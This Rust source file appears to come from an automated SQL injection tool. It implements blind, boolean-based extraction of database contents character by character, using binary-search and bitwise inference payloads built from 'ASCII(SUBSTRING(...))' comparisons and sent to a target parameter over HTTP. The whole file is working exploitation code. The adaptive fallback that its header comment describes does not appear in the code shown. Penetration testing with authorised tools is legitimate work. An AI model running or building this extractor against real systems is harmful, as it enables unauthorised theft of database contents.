//! Character-by-character extractor.
//!
//! Two modes:
//! - [`ExtractMode::BinarySearch`] — 7-8 reqs/char on a stable oracle
//! - [`ExtractMode::Bitwise`] — exactly 7 reqs/char (one per bit, 7-bit ASCII)
//!
//! Adaptive: starts in binary-search; if more than `noise_threshold` of recent
//! queries returned `Inconclusive`, falls back to bitwise.

use crate::errors::{Error, Result};
use crate::http::HttpEngine;
use crate::oracle::{Oracle, OracleVerdict};
use crate::target::Target;
use serde::{Deserialize, Serialize};
use std::sync::Arc;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ExtractMode {
    BinarySearch,
    Bitwise,
}

#[derive(Debug, Clone)]
pub struct ExtractCtx {
    pub engine: HttpEngine,
    pub target: Target,
    pub param: String,
    pub payload_template: String, // contains [INFERENCE] placeholder
    pub working_boundary_prefix: String,
    pub working_boundary_suffix: String,
    pub oracle: Arc<parking_lot::Mutex<Oracle>>,
    pub start_pos: usize,
    pub max_len: usize,
    pub mode: ExtractMode,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ExtractResult {
    pub data: String,
    pub queries: u64,
    pub truncated: bool,
}

pub struct Extractor;

impl Extractor {
    pub async fn extract_string(ctx: &mut ExtractCtx, sql: &str) -> Result<ExtractResult> {
        let mut out = String::new();
        let mut queries = 0u64;
        let mut pos = ctx.start_pos.max(1);
        loop {
            let ch = Self::extract_char(ctx, sql, pos, &mut queries).await?;
            match ch {
                Some(c) if c == '\0' => break,
                Some(c) => out.push(c),
                None => break,
            }
            pos += 1;
            if out.len() >= ctx.max_len {
                return Ok(ExtractResult { data: out, queries, truncated: true });
            }
        }
        Ok(ExtractResult { data: out, queries, truncated: false })
    }

    pub async fn extract_char(
        ctx: &mut ExtractCtx,
        sql: &str,
        pos: usize,
        queries: &mut u64,
    ) -> Result<Option<char>> {
        match ctx.mode {
            ExtractMode::BinarySearch => Self::binary_search_char(ctx, sql, pos, queries).await,
            ExtractMode::Bitwise => Self::bitwise_char(ctx, sql, pos, queries).await,
        }
    }

    async fn binary_search_char(
        ctx: &mut ExtractCtx,
        sql: &str,
        pos: usize,
        queries: &mut u64,
    ) -> Result<Option<char>> {
        let mut lo: u32 = 0;
        let mut hi: u32 = 127;
        while lo < hi {
            let mid = (lo + hi) / 2;
            let inference = format!("ASCII(SUBSTRING(({}),{},1))>{}", sql, pos, mid);
            let payload = ctx
                .payload_template
                .replace("[INFERENCE]", &inference)
                .replace("[PREFIX]", &ctx.working_boundary_prefix)
                .replace("[SUFFIX]", &ctx.working_boundary_suffix);
            *queries += 1;
            let resp = ctx.engine.send_with_payload(&ctx.target, &ctx.param, &payload).await?;
            let verdict = ctx.oracle.lock().judge(&resp);
            match verdict {
                Ok(OracleVerdict::True) => lo = mid + 1,
                Ok(OracleVerdict::False) => hi = mid,
                _ => return Err(Error::OracleInconclusive("binary_search".into())),
            }
        }
        if lo == 0 {
            return Ok(Some('\0'));
        }
        Ok(char::from_u32(lo))
    }

    async fn bitwise_char(
        ctx: &mut ExtractCtx,
        sql: &str,
        pos: usize,
        queries: &mut u64,
    ) -> Result<Option<char>> {
        let mut byte: u8 = 0;
        for bit in (0..7).rev() {
            let mask = 1u8 << bit;
            let inference = format!("ASCII(SUBSTRING(({}),{},1))&{}={}", sql, pos, mask, mask);
            let payload = ctx
                .payload_template
                .replace("[INFERENCE]", &inference)
                .replace("[PREFIX]", &ctx.working_boundary_prefix)
                .replace("[SUFFIX]", &ctx.working_boundary_suffix);
            *queries += 1;
            let resp = ctx.engine.send_with_payload(&ctx.target, &ctx.param, &payload).await?;
            let verdict = ctx.oracle.lock().judge(&resp);
            match verdict {
                Ok(OracleVerdict::True) => byte |= mask,
                Ok(OracleVerdict::False) => {}
                _ => return Err(Error::OracleInconclusive("bitwise".into())),
            }
        }
        if byte == 0 {
            return Ok(Some('\0'));
        }
        Ok(Some(byte as char))
    }
}
